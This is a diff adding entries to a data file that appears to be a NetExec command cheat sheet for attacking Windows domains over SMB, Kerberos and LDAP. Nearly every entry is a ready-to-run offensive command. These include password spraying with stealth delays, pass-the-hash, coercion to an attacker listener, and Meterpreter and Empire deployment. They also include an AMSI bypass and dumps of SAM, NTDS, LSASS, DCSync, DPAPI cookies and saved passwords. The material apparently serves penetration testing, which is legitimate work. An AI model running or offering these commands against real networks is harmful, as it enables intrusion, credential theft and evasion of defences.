+{id:43,n:"No Bruteforce Mode",cat:"General",sub:"Brute Force",proto:"General",ph:"cred",noise:"medium",acc:"Network",cred:"Password",purp:"One-to-one user:pass mapping",cmd:"nxc <PROTOCOL> <TARGET> -u <USERS_FILE> -p <PASSWORDS_FILE> --no-bruteforce",tips:"user1→pass1, user2→pass2. Avoids lockouts."},
+{id:44,n:"Continue on Success",cat:"General",sub:"Brute Force",proto:"General",ph:"cred",noise:"high",acc:"Network",cred:"Password",purp:"Continue after valid creds",cmd:"nxc <PROTOCOL> <TARGET> -u <USERS_FILE> -p <PASS> --continue-on-success",tips:"Find ALL valid accounts. Incompatible with command execution."},
+{id:45,n:"Jitter - Fixed Delay",cat:"General",sub:"Brute Force",proto:"General",ph:"cred",noise:"low",acc:"Network",cred:"Password",purp:"Fixed delay between attempts",cmd:"nxc <PROTOCOL> <TARGET> --jitter 3 -u <USERS_FILE> -p <PASSWORDS_FILE>",tips:"3 second delay. Helps avoid detection."},
+{id:46,n:"Jitter - Random Delay",cat:"General",sub:"Brute Force",proto:"General",ph:"cred",noise:"low",acc:"Network",cred:"Password",purp:"Random delay between attempts",cmd:"nxc <PROTOCOL> <TARGET> --jitter 2-5 -u <USERS_FILE> -p <PASSWORDS_FILE>",tips:"Random 2-5 second delay. More stealthy."},
+{id:47,n:"Kerberos with Password",cat:"General",sub:"Kerberos",proto:"SMB",ph:"enum",noise:"medium",acc:"Domain",cred:"Password",purp:"Kerberos authentication",cmd:"nxc smb <TARGET> -u <USER> -p <PASS> -k",tips:"Auto handles TGT/ST. Requires DNS resolution."},
+{id:48,n:"Set Ticket Cache",cat:"General",sub:"Kerberos",proto:"General",ph:"setup",noise:"low",acc:"Local",cred:"Ticket",purp:"Set KRB5CCNAME variable",cmd:"export KRB5CCNAME=<CCACHE_FILE>",tips:"Point to .ccache ticket file."},
+{id:49,n:"Use Cached Ticket",cat:"General",sub:"Kerberos",proto:"SMB",ph:"enum",noise:"medium",acc:"Domain",cred:"Ticket",purp:"Auth with cached ticket",cmd:"nxc smb <TARGET> --use-kcache",tips:"Uses ticket from KRB5CCNAME."},
+{id:50,n:"Execute with Ticket",cat:"General",sub:"Kerberos",proto:"SMB",ph:"exploit",noise:"high",acc:"Domain",cred:"Ticket",purp:"Command exec with ticket",cmd:"nxc smb <TARGET> --use-kcache -x whoami",tips:"Combines ticket auth with exec."},
+{id:51,n:"LDAP Kerberos KDC",cat:"General",sub:"Kerberos",proto:"LDAP",ph:"enum",noise:"medium",acc:"Domain",cred:"Ticket",purp:"LDAP with KDC host",cmd:"nxc ldap <TARGET> -k --kdcHost <KDC_HOST>",tips:"Use when domain resolution fails."},
+{id:52,n:"PFX Certificate Auth",cat:"General",sub:"Certificates",proto:"SMB",ph:"enum",noise:"medium",acc:"Network",cred:"Certificate",purp:"Auth with PFX certificate",cmd:"nxc smb <TARGET> --pfx-cert <PFX_FILE> -u <USER>",tips:"Generates ccache file for Kerberos."},
+{id:53,n:"PFX with Password",cat:"General",sub:"Certificates",proto:"SMB",ph:"enum",noise:"medium",acc:"Network",cred:"Certificate",purp:"Password-protected PFX",cmd:"nxc smb <TARGET> --pfx-cert <PFX_FILE> --pfx-pass <PFX_PASS> -u <USER>",tips:"When PFX is password protected."},
+{id:54,n:"Base64 PFX Auth",cat:"General",sub:"Certificates",proto:"SMB",ph:"enum",noise:"medium",acc:"Network",cred:"Certificate",purp:"Base64 encoded PFX",cmd:"nxc smb <TARGET> --pfx-base64 <PFX_B64> -u <USER>",tips:"Useful for passing cert as string."},
+{id:55,n:"PEM Certificate Auth",cat:"General",sub:"Certificates",proto:"SMB",ph:"enum",noise:"medium",acc:"Network",cred:"Certificate",purp:"PEM cert and key files",cmd:"nxc smb <TARGET> --pem-cert <PEM_CERT> --pem-key <PEM_KEY> -u <USER>",tips:"Separate certificate and key."},
+{id:56,n:"Run Module",cat:"General",sub:"Modules",proto:"General",ph:"post",noise:"medium",acc:"Network",cred:"Password",purp:"Execute a module",cmd:"nxc <PROTOCOL> <TARGET> -M <MODULE>",tips:"Modules extend functionality."},
+{id:57,n:"Module with Credentials",cat:"General",sub:"Modules",proto:"SMB",ph:"post",noise:"high",acc:"Admin",cred:"Password",purp:"Run module with auth",cmd:"nxc smb <TARGET> -u <USER> -p <PASS> -M lsassy",tips:"Most modules require admin."},
+{id:58,n:"Module with Options",cat:"General",sub:"Modules",proto:"General",ph:"post",noise:"medium",acc:"Network",cred:"Password",purp:"Pass module options",cmd:"nxc <PROTOCOL> <TARGET> -M <MODULE> -o <OPTION>=<VALUE>",tips:"MSFvenom-style KEY=value."},
+{id:59,n:"Multiple Modules",cat:"General",sub:"Modules",proto:"General",ph:"post",noise:"high",acc:"Network",cred:"Password",purp:"Run multiple modules",cmd:"nxc <PROTOCOL> <TARGET> -M <MODULE1> -M <MODULE2>",tips:"Each module with -M flag."},
+{id:60,n:"Custom DNS Server",cat:"General",sub:"DNS Options",proto:"General",ph:"enum",noise:"low",acc:"Network",cred:"Password",purp:"Use custom DNS",cmd:"nxc <PROTOCOL> <TARGET> -u <USER> -p <PASS> --dns-server <DNS_IP>",tips:"Override system DNS."},
+{id:61,n:"DNS Timeout",cat:"General",sub:"DNS Options",proto:"General",ph:"enum",noise:"low",acc:"Network",cred:"Password",purp:"Set DNS timeout",cmd:"nxc <PROTOCOL> <TARGET> -u <USER> -p <PASS> --dns-timeout <SECONDS>",tips:"Increase for slow networks."},
+{id:62,n:"DNS over TCP",cat:"General",sub:"DNS Options",proto:"General",ph:"enum",noise:"low",acc:"Network",cred:"Password",purp:"Force TCP for DNS",cmd:"nxc <PROTOCOL> <TARGET> -u <USER> -p <PASS> --dns-tcp",tips:"More reliable than UDP."},
+{id:63,n:"Force IPv6",cat:"General",sub:"DNS Options",proto:"General",ph:"enum",noise:"low",acc:"Network",cred:"Password",purp:"IPv6 connections",cmd:"nxc <PROTOCOL> <TARGET> -u <USER> -p <PASS> -6",tips:"For IPv6 environments."},
+{id:64,n:"Database Shell",cat:"General",sub:"Database",proto:"General",ph:"setup",noise:"low",acc:"Local",cred:"None",purp:"Open nxcdb shell",cmd:"nxcdb",tips:"Manage workspaces, creds, export."},
+{id:65,n:"Create Workspace",cat:"General",sub:"Database",proto:"General",ph:"setup",noise:"low",acc:"Local",cred:"None",purp:"Create new workspace",cmd:"workspace create <NAME>",tips:"Separate different engagements."},
+{id:66,n:"Switch Workspace",cat:"General",sub:"Database",proto:"General",ph:"setup",noise:"low",acc:"Local",cred:"None",purp:"Switch workspace",cmd:"workspace <NAME>",tips:"All actions stored in current."},
+{id:67,n:"List Workspaces",cat:"General",sub:"Database",proto:"General",ph:"setup",noise:"low",acc:"Local",cred:"None",purp:"Show all workspaces",cmd:"workspace list",tips:"Arrow shows current."},
+{id:68,n:"Export to CSV",cat:"General",sub:"Database",proto:"General",ph:"setup",noise:"low",acc:"Local",cred:"None",purp:"Export database data",cmd:"export shares detailed <OUTPUT_FILE>",tips:"Export creds, hosts, shares."},
+{id:69,n:"Log to File",cat:"General",sub:"Logging",proto:"General",ph:"post",noise:"low",acc:"Network",cred:"None",purp:"Save output to file",cmd:"nxc <PROTOCOL> <TARGET> --log <FILENAME>",tips:"Logs current command output."},
+{id:70,n:"Generate Hosts File",cat:"General",sub:"Logging",proto:"General",ph:"recon",noise:"low",acc:"Network",cred:"None",purp:"Create /etc/hosts entries",cmd:"nxc <PROTOCOL> <TARGET> --generate-hosts-file",tips:"Useful in labs without DNS."},
+{id:71,n:"Generate krb5.conf",cat:"General",sub:"Logging",proto:"SMB",ph:"setup",noise:"low",acc:"Network",cred:"Password",purp:"Generate Kerberos config",cmd:"nxc smb <TARGET> -u <USER> -p <PASS> --generate-krb5-file <PATH>",tips:"Then: export KRB5_CONFIG=path"},
+{id:72,n:"Generate TGT",cat:"General",sub:"Logging",proto:"SMB",ph:"cred",noise:"medium",acc:"Domain",cred:"Password",purp:"Generate and save TGT",cmd:"nxc smb <TARGET> -u <USER> -p <PASS> --generate-tgt <PATH>",tips:"Then: export KRB5CCNAME=path"},
+
+// ========== VULNERABILITIES (14) ==========
+{id:73,n:"Check ZeroLogon",cat:"Vulnerabilities",sub:"CVE Checks",proto:"SMB",ph:"recon",noise:"low",acc:"Network",cred:"None",purp:"CVE-2020-1472 ZeroLogon",cmd:"nxc smb <TARGET> -u '' -p '' -M zerologon",tips:"Critical DC vulnerability. No auth required."},
+{id:74,n:"Check noPAC",cat:"Vulnerabilities",sub:"CVE Checks",proto:"SMB",ph:"recon",noise:"low",acc:"Network",cred:"Password",purp:"CVE-2021-42278 noPAC",cmd:"nxc smb <TARGET> -u <USER> -p <PASS> -M nopac",tips:"Requires valid credentials."},
+{id:75,n:"Check PrintNightmare",cat:"Vulnerabilities",sub:"CVE Checks",proto:"SMB",ph:"recon",noise:"low",acc:"Network",cred:"None",purp:"CVE-2021-34527 PrintNightmare",cmd:"nxc smb <TARGET> -u '' -p '' -M printnightmare",tips:"Print Spooler RCE."},
+{id:76,n:"Check SMBGhost",cat:"Vulnerabilities",sub:"CVE Checks",proto:"SMB",ph:"recon",noise:"low",acc:"Network",cred:"None",purp:"CVE-2020-0796 SMBGhost",cmd:"nxc smb <TARGET> -u '' -p '' -M smbghost",tips:"SMBv3 compression vulnerability."},
+{id:77,n:"Check MS17-010",cat:"Vulnerabilities",sub:"CVE Checks",proto:"SMB",ph:"recon",noise:"low",acc:"Network",cred:"None",purp:"EternalBlue MS17-010",cmd:"nxc smb <TARGET> -u '' -p '' -M ms17-010",tips:"Not tested outside LAB."},
+{id:78,n:"Check NTLM Reflection",cat:"Vulnerabilities",sub:"CVE Checks",proto:"SMB",ph:"recon",noise:"low",acc:"Network",cred:"Password",purp:"CVE-2025-33073",cmd:"nxc smb <TARGET> -u <USER> -p <PASS> -M ntlm_reflection",tips:"Requires credentials."},
+{id:79,n:"Coerce Plus Scan",cat:"Vulnerabilities",sub:"Coercion",proto:"SMB",ph:"recon",noise:"low",acc:"Network",cred:"None",purp:"Check all coerce vulns",cmd:"nxc smb <TARGET> -u '' -p '' -M coerce_plus",tips:"PetitPotam, DFSCoerce, PrinterBug, etc."},
+{id:80,n:"Coerce with Listener",cat:"Vulnerabilities",sub:"Coercion",proto:"SMB",ph:"exploit",noise:"medium",acc:"Network",cred:"None",purp:"Coerce to attacker IP",cmd:"nxc smb <TARGET> -u '' -p '' -M coerce_plus -o LISTENER=<ATTACKER_IP>",tips:"Chain with NTLM relay."},
+{id:81,n:"Coerce All Methods",cat:"Vulnerabilities",sub:"Coercion",proto:"SMB",ph:"exploit",noise:"high",acc:"Network",cred:"None",purp:"Run all coerce methods",cmd:"nxc smb <TARGET> -u '' -p '' -M coerce_plus -o LISTENER=<ATTACKER_IP> ALWAYS=true",tips:"Runs all methods regardless of success."},
+{id:82,n:"Check PetitPotam",cat:"Vulnerabilities",sub:"Coercion",proto:"SMB",ph:"recon",noise:"low",acc:"Network",cred:"None",purp:"PetitPotam only",cmd:"nxc smb <TARGET> -u '' -p '' -M coerce_plus -o METHOD=PetitPotam",tips:"Or use M=pe shortform."},
+{id:83,n:"Check PrinterBug",cat:"Vulnerabilities",sub:"Coercion",proto:"SMB",ph:"recon",noise:"low",acc:"Network",cred:"None",purp:"PrinterBug/SpoolSample",cmd:"nxc smb <TARGET> -u '' -p '' -M coerce_plus -o M=pr",tips:"Shortform: M=pr"},
+{id:84,n:"Check DFSCoerce",cat:"Vulnerabilities",sub:"Coercion",proto:"SMB",ph:"recon",noise:"low",acc:"Network",cred:"None",purp:"DFSCoerce only",cmd:"nxc smb <TARGET> -u '' -p '' -M coerce_plus -o M=dfs",tips:"Shortform: M=dfs"},
+
+// ========== SMB - ENUMERATION (24) ==========
+{id:85,n:"Discover Hosts",cat:"SMB",sub:"Enumeration",proto:"SMB",ph:"recon",noise:"medium",acc:"Network",cred:"None",purp:"Map network hosts",cmd:"nxc smb <TARGET>/24",tips:"Returns live hosts with OS info, signing status."},
+{id:86,n:"Null Session Check",cat:"SMB",sub:"Enumeration",proto:"SMB",ph:"enum",noise:"low",acc:"Network",cred:"None",purp:"Check null session",cmd:"nxc smb <TARGET> -u '' -p ''",tips:"Very useful on DCs to enum users, groups, policies."},
+{id:87,n:"Shares via Null Session",cat:"SMB",sub:"Enumeration",proto:"SMB",ph:"enum",noise:"low",acc:"Network",cred:"None",purp:"Enum shares without auth",cmd:"nxc smb <TARGET> -u '' -p '' --shares",tips:"Check what's accessible anonymously."},
+{id:88,n:"Password Policy Null",cat:"SMB",sub:"Enumeration",proto:"SMB",ph:"enum",noise:"low",acc:"Network",cred:"None",purp:"Get password policy",cmd:"nxc smb <TARGET> -u '' -p '' --pass-pol",tips:"Lockout threshold, complexity, history."},
+{id:89,n:"Users via Null Session",cat:"SMB",sub:"Enumeration",proto:"SMB",ph:"enum",noise:"low",acc:"Network",cred:"None",purp:"Enum users without auth",cmd:"nxc smb <TARGET> -u '' -p '' --users",tips:"Domain user enumeration."},
+{id:90,n:"Groups via Null Session",cat:"SMB",sub:"Enumeration",proto:"SMB",ph:"enum",noise:"low",acc:"Network",cred:"None",purp:"Enum groups without auth",cmd:"nxc smb <TARGET> -u '' -p '' --groups",tips:"Domain group enumeration."},
+{id:91,n:"Guest Login Check",cat:"SMB",sub:"Enumeration",proto:"SMB",ph:"enum",noise:"low",acc:"Network",cred:"None",purp:"Check guest login",cmd:"nxc smb <TARGET> -u 'a' -p ''",tips:"Empty password, random user."},
+{id:92,n:"Shares via Guest",cat:"SMB",sub:"Enumeration",proto:"SMB",ph:"enum",noise:"low",acc:"Network",cred:"None",purp:"Enum shares as guest",cmd:"nxc smb <TARGET> -u 'a' -p '' --shares",tips:"May see more than null session."},
+{id:93,n:"Generate Relay List",cat:"SMB",sub:"Enumeration",proto:"SMB",ph:"recon",noise:"medium",acc:"Network",cred:"None",purp:"Hosts without SMB signing",cmd:"nxc smb <TARGET>/24 --gen-relay-list <OUTPUT_FILE>",tips:"Essential for NTLM relay attacks."},
+{id:94,n:"Shares with Credentials",cat:"SMB",sub:"Shares & Files",proto:"SMB",ph:"enum",noise:"medium",acc:"Network",cred:"Password",purp:"Enum all share permissions",cmd:"nxc smb <TARGET>/24 -u <USER> -p <PASS> --shares",tips:"One of the most useful features!"},
+{id:95,n:"Filter READ/WRITE Shares",cat:"SMB",sub:"Shares & Files",proto:"SMB",ph:"enum",noise:"medium",acc:"Network",cred:"Password",purp:"Only R/W accessible shares",cmd:"nxc smb <TARGET>/24 -u <USER> -p <PASS> --shares READ,WRITE",tips:"Filter by access level."},
+{id:96,n:"Filter READ Shares",cat:"SMB",sub:"Shares & Files",proto:"SMB",ph:"enum",noise:"medium",acc:"Network",cred:"Password",purp:"Only readable shares",cmd:"nxc smb <TARGET>/24 -u <USER> -p <PASS> --shares READ",tips:"Find data to exfiltrate."},
+{id:97,n:"Filter WRITE Shares",cat:"SMB",sub:"Shares & Files",proto:"SMB",ph:"enum",noise:"medium",acc:"Network",cred:"Password",purp:"Only writable shares",cmd:"nxc smb <TARGET>/24 -u <USER> -p <PASS> --shares WRITE",tips:"Potential payload drop locations."},
+{id:98,n:"Enumerate Disks",cat:"SMB",sub:"Enumeration",proto:"SMB",ph:"enum",noise:"medium",acc:"Network",cred:"Password",purp:"List remote disks",cmd:"nxc smb <TARGET>/24 -u <USER> -p <PASS> --disks",tips:"See all mounted drives."},
+{id:99,n:"Remote Registry Sessions",cat:"SMB",sub:"Enumeration",proto:"SMB",ph:"enum",noise:"medium",acc:"Network",cred:"Password",purp:"Logged-on users via registry",cmd:"nxc smb <TARGET>/24 -u <USER> -p <PASS> --reg-sessions",tips:"Uses Remote Registry Service."},
+{id:100,n:"Enumerate Domain Users",cat:"SMB",sub:"Enumeration",proto:"SMB",ph:"enum",noise:"medium",acc:"Network",cred:"Password",purp:"List domain users",cmd:"nxc smb <TARGET>/24 -u <USER> -p <PASS> --users",tips:"Get all domain user accounts."},
+{id:101,n:"Export Domain Users",cat:"SMB",sub:"Enumeration",proto:"SMB",ph:"enum",noise:"medium",acc:"Network",cred:"Password",purp:"Export users to file",cmd:"nxc smb <TARGET> -u <USER> -p <PASS> --users-export <OUTPUT_FILE>",tips:"Save for password spraying."},
+{id:102,n:"RID Bruteforce",cat:"SMB",sub:"Enumeration",proto:"SMB",ph:"enum",noise:"high",acc:"Network",cred:"Password",purp:"Brute force RIDs",cmd:"nxc smb <TARGET>/24 -u <USER> -p <PASS> --rid-brute",tips:"Find users not in normal enum."},
+{id:103,n:"Enumerate Local Groups",cat:"SMB",sub:"Enumeration",proto:"SMB",ph:"enum",noise:"medium",acc:"Network",cred:"Password",purp:"List local groups",cmd:"nxc smb <TARGET>/24 -u <USER> -p <PASS> --local-group",tips:"Find local admin memberships."},
+{id:104,n:"Password Policy Auth",cat:"SMB",sub:"Enumeration",proto:"SMB",ph:"enum",noise:"medium",acc:"Network",cred:"Password",purp:"Get password policy",cmd:"nxc smb <TARGET>/24 -u <USER> -p <PASS> --pass-pol",tips:"Check before spraying."},
+{id:105,n:"SCCM Reconnaissance",cat:"SMB",sub:"Enumeration",proto:"SMB",ph:"enum",noise:"medium",acc:"Network",cred:"Password",purp:"Enumerate SCCM (RECON-6)",cmd:"nxc smb <TARGET> -u <USER> -p <PASS> -M sccm-recon6",tips:"Find SCCM Site Servers, Management Points."},
+
+// ========== SMB - AUTHENTICATION (8) ==========
+{id:106,n:"Domain Authentication",cat:"SMB",sub:"Authentication",proto:"SMB",ph:"enum",noise:"medium",acc:"Network",cred:"Password",purp:"Auth with domain creds",cmd:"nxc smb <TARGET>/24 -u <USER> -p <PASS>",tips:"(Pwn3d!) = local admin access."},
+{id:107,n:"Pass-the-Hash LM:NT",cat:"SMB",sub:"Authentication",proto:"SMB",ph:"enum",noise:"medium",acc:"Network",cred:"Hash",purp:"Auth with full hash",cmd:"nxc smb <TARGET>/24 -u <USER> -H '<LM_HASH>:<NT_HASH>'",tips:"Format: LM:NT or just NT."},
+{id:108,n:"Pass-the-Hash NT Only",cat:"SMB",sub:"Authentication",proto:"SMB",ph:"enum",noise:"medium",acc:"Network",cred:"Hash",purp:"Auth with NT hash only",cmd:"nxc smb <TARGET>/24 -u <USER> -H '<NT_HASH>'",tips:"Most common PTH format."},
+{id:109,n:"Local Account Auth",cat:"SMB",sub:"Authentication",proto:"SMB",ph:"enum",noise:"medium",acc:"Network",cred:"Password",purp:"Authenticate locally",cmd:"nxc smb <TARGET>/24 -u <USER> -p <PASS> --local-auth",tips:"For local accounts only."},
+{id:110,n:"Local Null Session",cat:"SMB",sub:"Authentication",proto:"SMB",ph:"enum",noise:"low",acc:"Network",cred:"None",purp:"Local null session",cmd:"nxc smb <TARGET>/24 -u '' -p '' --local-auth",tips:"Check local anonymous access."},
+{id:111,n:"Local Pass-the-Hash",cat:"SMB",sub:"Authentication",proto:"SMB",ph:"enum",noise:"medium",acc:"Network",cred:"Hash",purp:"Local PTH auth",cmd:"nxc smb <TARGET>/24 -u <USER> -H '<NT_HASH>' --local-auth",tips:"PTH with local account."},
+
+// ========== SMB - PASSWORD SPRAY (4) ==========
+{id:112,n:"Spray to Multiple Users",cat:"SMB",sub:"Password Spray",proto:"SMB",ph:"cred",noise:"high",acc:"Network",cred:"Password",purp:"Spray password",cmd:"nxc smb <TARGET> -u <USER1> <USER2> -p <PASS>",tips:"Watch for lockouts!"},
+{id:113,n:"Try Multiple Passwords",cat:"SMB",sub:"Password Spray",proto:"SMB",ph:"cred",noise:"high",acc:"Network",cred:"Password",purp:"Multi-password spray",cmd:"nxc smb <TARGET> -u <USER> -p <PASS1> <PASS2>",tips:"Try each password."},
+{id:114,n:"Spray from User File",cat:"SMB",sub:"Password Spray",proto:"SMB",ph:"cred",noise:"high",acc:"Network",cred:"Password",purp:"Spray from file",cmd:"nxc smb <TARGET> -u <USERS_FILE> -p <PASS>",tips:"One user per line."},
+{id:115,n:"Check User=Password",cat:"SMB",sub:"Password Spray",proto:"SMB",ph:"cred",noise:"medium",acc:"Network",cred:"Password",purp:"Username as password",cmd:"nxc smb <TARGET> -u <USERS_FILE> -p <USERS_FILE> --no-bruteforce --continue-on-success",tips:"Common weak password pattern."},
+
+// ========== SMB - COMMAND EXECUTION (5) ==========
+{id:116,n:"Execute Command",cat:"SMB",sub:"Command Exec",proto:"SMB",ph:"exploit",noise:"high",acc:"Admin",cred:"Password",purp:"Run system command",cmd:"nxc smb <TARGET> -u Administrator -p <PASS> -x whoami",tips:"Requires admin. Uses wmiexec by default."},
+{id:117,n:"Execute PowerShell",cat:"SMB",sub:"Command Exec",proto:"SMB",ph:"exploit",noise:"high",acc:"Admin",cred:"Password",purp:"Run PowerShell command",cmd:"nxc smb <TARGET> -u Administrator -p <PASS> -X '$PSVersionTable'",tips:"Use -X for PowerShell."},
+{id:118,n:"PowerShell AMSI Bypass",cat:"SMB",sub:"Command Exec",proto:"SMB",ph:"exploit",noise:"high",acc:"Admin",cred:"Password",purp:"Bypass AMSI",cmd:"nxc smb <TARGET> -u Administrator -p <PASS> -X '$PSVersionTable' --amsi-bypass",tips:"Evade AV scanning."},
+{id:119,n:"Deploy Empire Agent",cat:"SMB",sub:"Command Exec",proto:"SMB",ph:"exploit",noise:"high",acc:"Admin",cred:"Password",purp:"Deploy Empire shell",cmd:"nxc <TARGET>/24 -u <USER> -p <PASS> -M empire_exec -o LISTENER=<LISTENER>",tips:"Configure Empire REST API first."},
+{id:120,n:"Deploy Meterpreter",cat:"SMB",sub:"Command Exec",proto:"SMB",ph:"exploit",noise:"high",acc:"Admin",cred:"Password",purp:"Deploy Meterpreter",cmd:"nxc <TARGET>/24 -u <USER> -p <PASS> -M met_inject -o SRVHOST=<ATTACKER_IP> SRVPORT=<PORT>",tips:"Use web_delivery module."},
+
+// ========== SMB - FILE OPERATIONS (5) ==========
+{id:121,n:"Spider Share Pattern",cat:"SMB",sub:"Shares & Files",proto:"SMB",ph:"enum",noise:"medium",acc:"Network",cred:"Password",purp:"Search files by pattern",cmd:"nxc smb <TARGET> -u <USER> -p <PASS> --spider C\\$ --pattern txt",tips:"Escape $ with backslash."},
+{id:122,n:"Spider Plus - List",cat:"SMB",sub:"Shares & Files",proto:"SMB",ph:"enum",noise:"medium",acc:"Network",cred:"Password",purp:"List all readable files",cmd:"nxc smb <TARGET> -u <USER> -p <PASS> -M spider_plus",tips:"Comprehensive file listing."},
+{id:123,n:"Spider Plus - Download",cat:"SMB",sub:"Shares & Files",proto:"SMB",ph:"enum",noise:"high",acc:"Network",cred:"Password",purp:"Download all files",cmd:"nxc smb <TARGET> -u <USER> -p <PASS> -M spider_plus -o DOWNLOAD_FLAG=True",tips:"Downloads everything readable."},
+{id:124,n:"Upload File",cat:"SMB",sub:"Shares & Files",proto:"SMB",ph:"exploit",noise:"high",acc:"Network",cred:"Password",purp:"Upload file via SMB",cmd:"nxc smb <TARGET> -u <USER> -p <PASS> --put-file <LOCAL_FILE> \\\\Windows\\\\Temp\\\\file.txt",tips:"Double backslash remote path."},
+{id:125,n:"Download File",cat:"SMB",sub:"Shares & Files",proto:"SMB",ph:"enum",noise:"medium",acc:"Network",cred:"Password",purp:"Download file via SMB",cmd:"nxc smb <TARGET> -u <USER> -p <PASS> --get-file \\\\Windows\\\\Temp\\\\file.txt <LOCAL_FILE>",tips:"Download remote files."},
+
+// ========== SMB - CREDENTIAL DUMP (27) ==========
+{id:126,n:"Dump SAM",cat:"SMB",sub:"Credential Dump",proto:"SMB",ph:"post",noise:"high",acc:"Admin",cred:"Password",purp:"Dump local SAM hashes",cmd:"nxc smb <TARGET>/24 -u <USER> -p <PASS> --sam",tips:"Local admin required. Use --local-auth for local accounts."},
+{id:127,n:"Dump LSA Secrets",cat:"SMB",sub:"Credential Dump",proto:"SMB",ph:"post",noise:"high",acc:"Admin",cred:"Password",purp:"Dump LSA secrets",cmd:"nxc smb <TARGET>/24 -u <USER> -p <PASS> --lsa",tips:"May contain service account passwords."},
+{id:128,n:"Dump NTDS.dit",cat:"SMB",sub:"Credential Dump",proto:"SMB",ph:"post",noise:"high",acc:"DC Admin",cred:"Password",purp:"Dump all AD hashes",cmd:"nxc smb <TARGET> -u <USER> -p <PASS> --ntds",tips:"Domain Controller only. Uses DRSUAPI."},
+{id:129,n:"NTDS Enabled Only",cat:"SMB",sub:"Credential Dump",proto:"SMB",ph:"post",noise:"high",acc:"DC Admin",cred:"Password",purp:"Only enabled users",cmd:"nxc smb <TARGET> -u <USER> -p <PASS> --ntds --enabled",tips:"Skip disabled accounts."},
+{id:130,n:"NTDS via VSS",cat:"SMB",sub:"Credential Dump",proto:"SMB",ph:"post",noise:"high",acc:"DC Admin",cred:"Password",purp:"NTDS via Volume Shadow",cmd:"nxc smb <TARGET> -u <USER> -p <PASS> --ntds vss",tips:"Alternative dump method."},
+{id:131,n:"NTDS Specific User",cat:"SMB",sub:"Credential Dump",proto:"SMB",ph:"post",noise:"high",acc:"DC Admin",cred:"Password",purp:"Dump single user",cmd:"nxc smb <TARGET> -u <USER> -p <PASS> --ntds --user Administrator",tips:"Use NETBIOS/user for multi-domain."},
+{id:132,n:"NTDS via ntdsutil",cat:"SMB",sub:"Credential Dump",proto:"SMB",ph:"post",noise:"high",acc:"DC Admin",cred:"Password",purp:"Dump via ntdsutil",cmd:"nxc smb <TARGET> -u <USER> -p <PASS> -M ntdsutil",tips:"Downloads and parses locally."},
+{id:133,n:"Dump LSASS - Lsassy",cat:"SMB",sub:"Credential Dump",proto:"SMB",ph:"post",noise:"high",acc:"Admin",cred:"Password",purp:"Dump LSASS with lsassy",cmd:"nxc smb <TARGET> -u administrator -p <PASS> -M lsassy",tips:"Most popular LSASS dump method."},
+{id:134,n:"Dump LSASS - Nanodump",cat:"SMB",sub:"Credential Dump",proto:"SMB",ph:"post",noise:"high",acc:"Admin",cred:"Password",purp:"Dump LSASS nanodump",cmd:"nxc smb <TARGET> -u administrator -p <PASS> -M nanodump",tips:"Alternative LSASS dumper."},
+{id:135,n:"Dump LSASS - Mimikatz",cat:"SMB",sub:"Credential Dump",proto:"SMB",ph:"post",noise:"high",acc:"Admin",cred:"Password",purp:"Mimikatz module",cmd:"nxc smb <TARGET> -u administrator -p <PASS> -M mimikatz",tips:"Deprecated but still works."},
+{id:136,n:"DCSync Attack",cat:"SMB",sub:"Credential Dump",proto:"SMB",ph:"post",noise:"high",acc:"DC Admin",cred:"Password",purp:"DCSync via mimikatz",cmd:'nxc smb <TARGET> -u Administrator -p <PASS> -M mimikatz -o COMMAND=\'"lsadump::dcsync /domain:<DOMAIN> /user:krbtgt"\'',tips:"Get any user's hash remotely."},
+{id:137,n:"Dump DPAPI",cat:"SMB",sub:"Credential Dump",proto:"SMB",ph:"post",noise:"high",acc:"Admin",cred:"Password",purp:"DPAPI credentials",cmd:"nxc smb <TARGET> -u <USER> -p <PASS> --dpapi",tips:"Chrome, Edge, Firefox, Credential Manager."},
+{id:138,n:"DPAPI with Cookies",cat:"SMB",sub:"Credential Dump",proto:"SMB",ph:"post",noise:"high",acc:"Admin",cred:"Password",purp:"Include browser cookies",cmd:"nxc smb <TARGET> -u <USER> -p <PASS> --dpapi cookies",tips:"Get session cookies too."},
+{id:139,n:"Dump SCCM Creds",cat:"SMB",sub:"Credential Dump",proto:"SMB",ph:"post",noise:"high",acc:"Admin",cred:"Password",purp:"SCCM credentials",cmd:"nxc smb <TARGET> -u <USER> -p <PASS> --sccm",tips:"Uses dploot method."},
+{id:140,n:"Dump Veeam Creds",cat:"SMB",sub:"Credential Dump",proto:"SMB",ph:"post",noise:"high",acc:"Admin",cred:"Password",purp:"Veeam backup passwords",cmd:"nxc smb <TARGET> -u <USER> -p <PASS> -M veeam",tips:"Backup server credentials."},
+{id:141,n:"Dump Token Broker Cache",cat:"SMB",sub:"Credential Dump",proto:"SMB",ph:"post",noise:"high",acc:"Admin",cred:"Password",purp:"Azure/M365 tokens",cmd:"nxc smb <TARGET> -u <USER> -p <PASS> -M wam",tips:"Cloud access tokens."},
+{id:142,n:"Dump WiFi Passwords",cat:"SMB",sub:"Credential Dump",proto:"SMB",ph:"post",noise:"high",acc:"Admin",cred:"Password",purp:"Saved WiFi keys",cmd:"nxc smb <TARGET> -u <USER> -p <PASS> -M wifi",tips:"Get wireless credentials."},
+{id:143,n:"Dump WinSCP Creds",cat:"SMB",sub:"Credential Dump",proto:"SMB",ph:"post",noise:"high",acc:"Admin",cred:"Password",purp:"WinSCP credentials",cmd:"nxc smb <TARGET> -u <USER> -p <PASS> -M winscp",tips:"Checks registry and files."},
+{id:144,n:"Dump VNC Passwords",cat:"SMB",sub:"Credential Dump",proto:"SMB",ph:"post",noise:"high",acc:"Admin",cred:"Password",purp:"VNC credentials",cmd:"nxc smb <TARGET> -u <USER> -p <PASS> -M vnc",tips:"RealVNC and TightVNC."},
+{id:145,n:"Dump mRemoteNG",cat:"SMB",sub:"Credential Dump",proto:"SMB",ph:"post",noise:"high",acc:"Admin",cred:"Password",purp:"mRemoteNG credentials",cmd:"nxc smb <TARGET> -u <USER> -p <PASS> -M mremoteng",tips:"Remote connection manager creds."},
+{id:146,n:"Dump RDCMan Creds",cat:"SMB",sub:"Credential Dump",proto:"SMB",ph:"post",noise:"high",acc:"Admin",cred:"Password",purp:"RDCMan credentials",cmd:"nxc smb <TARGET> -u <USER> -p <PASS> -M rdcman",tips:"Remote Desktop Connection Manager."},
+{id:147,n:"Dump PuTTY Creds",cat:"SMB",sub:"Credential Dump",proto:"SMB",ph:"post",noise:"high",acc:"Admin",cred:"Password",purp:"PuTTY private keys",cmd:"nxc smb <TARGET> -u <USER> -p <PASS> -M putty",tips:"SSH keys and proxy creds."},
+
+// ========== SMB - LAPS (2) ==========
